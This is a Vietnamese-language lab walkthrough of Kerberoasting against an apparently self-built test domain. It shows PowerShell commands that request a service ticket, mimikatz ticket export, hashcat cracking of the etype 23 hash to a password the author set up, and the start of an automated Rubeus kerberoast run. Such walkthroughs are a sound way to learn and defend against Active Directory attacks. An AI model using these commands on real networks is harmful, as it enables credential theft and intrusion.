## P1: Powershell (Thủ công)

### Enumeration - TGS Extraction

Đầu tiên là phương pháp thủ công với powershell. Vì chỉ có thể khai thác từng service account nên lấy ví dụ SQL:

```
MSSQLSvc/actvn.local:1433
```

Ta thực hiện request TGS bằng powershell:
```
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/actvn.local:1433"
```

![](../../Image/Pasted%20image%2020250831104340.png)

- `klist` để liệt kê các ticket Kerberos hiện có trong LSASS Ticket Cache:

![](../../Image/Pasted%20image%2020250831104440.png)

Theo kết quả, TGS server `MSSQLSvc/actvn.local:1433` được mã hóa bởi NT Hash

- `net user /domain`: Liệt kê các SAM name của các user trong domain (actvn.local)

![](../../Image/Pasted%20image%2020250831105431.png)

Đối với server `MSSQLSvc/actvn.local:1433` khả năng cao service account chính là `svc_sql`.

- Tiếp theo, dùng mimikatz nhằm extract các ticker dạng nhị phân `.kirbi` bao gồm TGS và TGT trong LSASS.

```
kerberos::list /export
```

![](../../Image/Pasted%20image%2020250831115746.png)

![](../../Image/Pasted%20image%2020250831115820.png)

### Password Cracking

- Chuyển dạng `kirbi` sang dạng mà Hashcat crack được hash:

![](../../Image/Pasted%20image%2020250831151616.png)

- Theo hashcat wiki, dạng hash là `Kerberoas 5, etype 23, TGS-REP`:

![](../../Image/Pasted%20image%2020250831151556.png)

- Thực hiện crack:
```
hashcat -m 13100 hashes.txt rockyou.txt
```

![](../../Image/Pasted%20image%2020250831154310.png)

Đúng như ta setup, password là `123456a@1`.
### Kiểm tra đăng nhập

- Port scan DC01:

![](../../Image/Pasted%20image%2020250831161837.png)

## P2: Rubeus (Tự động)

### TGS Extraction
- Khác với phương pháp thủ công là request từng TGS rồi dùng mimikatz để extract tickets hiện hữu trong LSASS Cache.
- Rubeus extract toàn bộ tickets bằng cách request TGS của tất cả các service account đến DC01:

```
.\Rubeus.exe kerberoast /outfile:spn.txt
```
